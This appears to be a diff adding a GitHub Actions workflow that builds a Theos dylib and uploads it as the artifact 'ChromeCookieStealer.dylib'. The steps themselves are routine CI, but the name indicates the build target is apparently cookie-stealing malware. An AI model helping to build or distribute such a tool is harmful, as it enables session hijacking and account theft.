@@ -1,0 +1,26 @@
+name: Build dylib
+
+on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Theos Build
+        uses: Randomblock1/theos-action@v1
+        with:
+          theos-sdks: 'https://github.com/theos/sdks'
+
+      - name: Upload dylib
+        uses: actions/upload-artifact@v4
+        with:
+          name: ChromeCookieStealer.dylib
+          path: ./obj/ChromeCookieStealer.dylib
